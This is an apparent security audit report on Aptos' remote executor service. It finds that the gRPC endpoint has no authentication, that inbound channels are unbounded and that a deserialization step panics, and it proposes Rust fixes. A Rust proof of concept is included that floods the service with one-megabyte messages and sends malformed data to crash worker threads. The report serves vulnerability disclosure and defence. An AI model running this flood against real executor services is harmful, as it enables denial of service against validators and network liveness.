# Audit Report

## Title
Unauthenticated Remote Executor Service Allows Memory Exhaustion and Service Crash via Unbounded Channel Flooding

## Summary
The `RemoteStateViewService` creates an unbounded inbound channel without any authentication or rate limiting on incoming gRPC connections. An attacker can establish connections to the executor service and flood it with malicious requests, leading to memory exhaustion or service crashes through either unbounded channel growth or malformed data causing panics.

## Finding Description

The vulnerability exists across multiple components in the remote executor service architecture:

**1. No Authentication on gRPC Endpoint**

The gRPC server accepts any incoming connection without authentication. [1](#0-0) 

The server is configured without any TLS or authentication middleware. [2](#0-1) 

**2. Unbounded Channel Creation**

The `create_inbound_channel()` method creates an unbounded crossbeam channel with no size limits. [3](#0-2) 

This unbounded channel is used to receive state view requests. [4](#0-3) 

**3. No Backpressure Mechanism**

The service continuously receives messages from the unbounded channel and spawns processing to a fixed-size thread pool. [5](#0-4) 

When the thread pool is saturated, messages accumulate indefinitely in the unbounded channel since there is no backpressure or rate limiting.

**4. Panic on Malformed Data**

The message handler calls `.unwrap()` on BCS deserialization, which will panic on invalid data. [6](#0-5) 

**5. Network Exposure**

The service is deployed as a standalone process listening on a network socket. [7](#0-6) 

The network controller starts the gRPC server on the configured address. [8](#0-7) 

**Attack Scenario:**

1. Attacker discovers the executor service listening on its configured port (e.g., via coordinator_address or shard addresses)
2. Attacker establishes gRPC connection (no authentication required)
3. Attacker sends massive flood of messages with `message_type = "remote_kv_request"`
4. Messages accumulate in unbounded channel faster than thread pool can process
5. Memory consumption grows unbounded until:
   - OOM killer terminates the service, OR
   - Service becomes unresponsive due to memory pressure
6. Alternatively, attacker sends malformed BCS-encoded data causing panic in worker thread

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The unbounded channel violates memory limits, and the lack of authentication violates access control principles.

## Impact Explanation

This is a **HIGH severity** vulnerability per Aptos bug bounty criteria:

- **Validator node slowdowns**: Memory exhaustion from unbounded channel growth causes severe performance degradation
- **API crashes**: Malformed data triggers panic, crashing worker threads and potentially the entire service
- **Significant protocol violations**: Loss of execution capability affects block processing

The executor service is critical infrastructure for block execution. If compromised:
- Block execution is delayed or halted
- Validator cannot participate in consensus properly
- Network liveness may be impacted if multiple validators are affected

This does NOT reach Critical severity because it:
- Does not directly cause loss of funds
- Does not break consensus safety (only liveness)
- Can be recovered by restarting the service
- Requires network access to the executor service endpoint

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **Low barrier to entry**: No authentication required, any network client can connect
2. **Simple exploitation**: Standard gRPC client can send flood of requests
3. **No complexity**: Direct attack path with no preconditions
4. **Discoverable**: Executor service ports may be discoverable through network scanning
5. **High motivation**: Disrupting validator execution is attractive to adversaries

The only requirement is network access to the executor service endpoint, which may be exposed if:
- Services are deployed without proper network isolation
- Firewall rules are misconfigured
- Internal network is compromised

## Recommendation

Implement multiple layers of defense:

**1. Add Authentication**
```rust
// In grpc_network_service/mod.rs, add TLS and authentication:
Server::builder()
    .tls_config(server_tls_config)? // Add TLS configuration
    .add_service(
        NetworkMessageServiceServer::with_interceptor(
            self,
            |req: Request<()>| {
                // Validate authentication token/certificate
                validate_peer_credentials(req)?;
                Ok(req)
            }
        )
    )
```

**2. Implement Bounded Channels with Backpressure**
```rust
// In network_controller/mod.rs:
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    // Use bounded channel instead of unbounded
    let (inbound_sender, inbound_receiver) = bounded(1000); // Set reasonable limit
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

**3. Add Rate Limiting**
```rust
// In grpc_network_service/mod.rs:
use std::sync::Arc;
use governor::{Quota, RateLimiter};

struct RateLimitedService {
    limiter: Arc<RateLimiter<...>>,
    // ... existing fields
}

// In simple_msg_exchange:
if self.limiter.check().is_err() {
    return Err(Status::resource_exhausted("Rate limit exceeded"));
}
```

**4. Handle Deserialization Errors Gracefully**
```rust
// In remote_state_view_service.rs:
let req: RemoteKVRequest = match bcs::from_bytes(&message.data) {
    Ok(req) => req,
    Err(e) => {
        error!("Failed to deserialize KV request: {}", e);
        return; // Drop invalid message instead of panicking
    }
};
```

**5. Network Isolation**
- Deploy executor services on isolated internal network
- Use firewall rules to restrict access to known coordinator/shard IPs only
- Consider VPN or mutual TLS for all inter-service communication

## Proof of Concept

```rust
// PoC: Flood the RemoteStateViewService with requests
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target executor service (replace with actual address)
    let target_addr = "http://127.0.0.1:52200";
    let mut client = NetworkMessageServiceClient::connect(target_addr).await?;
    
    println!("[*] Connected to executor service");
    
    // Attack 1: Memory exhaustion via unbounded channel flooding
    println!("[*] Starting flood attack...");
    for i in 0..1_000_000 {
        let request = tonic::Request::new(NetworkMessage {
            message: vec![0u8; 1024 * 1024], // 1MB per message
            message_type: "remote_kv_request".to_string(),
        });
        
        // Fire and forget - don't wait for response
        let _ = client.simple_msg_exchange(request).await;
        
        if i % 1000 == 0 {
            println!("[*] Sent {} messages", i);
        }
    }
    
    println!("[*] Flood complete - service should be experiencing memory pressure");
    
    // Attack 2: Crash via malformed data
    println!("[*] Sending malformed BCS data...");
    let malformed_request = tonic::Request::new(NetworkMessage {
        message: vec![0xFF; 100], // Invalid BCS encoding
        message_type: "remote_kv_request".to_string(),
    });
    
    client.simple_msg_exchange(malformed_request).await?;
    println!("[*] Malformed data sent - service thread should panic");
    
    Ok(())
}
```

**To verify:**
1. Start an executor service with `ProcessExecutorService`
2. Run the PoC against the service endpoint
3. Monitor memory consumption - should grow unbounded
4. Observe service crashes or OOM kills
5. Check logs for panic messages from malformed data

## Notes

This vulnerability is particularly concerning because:

1. **Defense in Depth Failure**: The service has NO security layers - no authentication, no rate limiting, no bounded resources
2. **Critical Infrastructure**: Executor services are essential for block processing and validator operation
3. **Easy Discovery**: Default port 52200 is predictable and scannable
4. **Cascading Impact**: Disrupting execution can affect consensus participation

The issue stems from treating the executor service as if it operates in a trusted internal network, when in practice it may be exposed to hostile networks. Even if intended to be internal-only, defense in depth principles require authentication and resource limits on all network-facing services.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-116)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L39-39)
```rust
        let result_rx = controller.create_inbound_channel(kv_request_type.to_string());
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L64-72)
```rust
    pub fn start(&self) {
        while let Ok(message) = self.kv_rx.recv() {
            let state_view = self.state_view.clone();
            let kv_txs = self.kv_tx.clone();
            self.thread_pool.spawn(move || {
                Self::handle_message(message, state_view, kv_txs);
            });
        }
    }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L86-86)
```rust
        let req: RemoteKVRequest = bcs::from_bytes(&message.data).unwrap();
```

**File:** execution/executor-service/src/process_executor_service.rs (L16-45)
```rust
impl ProcessExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let self_address = remote_shard_addresses[shard_id];
        info!(
            "Starting process remote executor service on {}; coordinator address: {}, other shard addresses: {:?}; num threads: {}",
            self_address, coordinator_address, remote_shard_addresses, num_threads
        );
        aptos_node_resource_metrics::register_node_metrics_collector(None);
        let _mp = MetricsPusher::start_for_local_run(
            &("remote-executor-service-".to_owned() + &shard_id.to_string()),
        );

        AptosVM::set_concurrency_level_once(num_threads);
        let mut executor_service = ExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            self_address,
            coordinator_address,
            remote_shard_addresses,
        );
        executor_service.start();
        Self { executor_service }
    }
```

**File:** execution/executor-service/src/remote_executor_service.rs (L30-31)
```rust
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
```
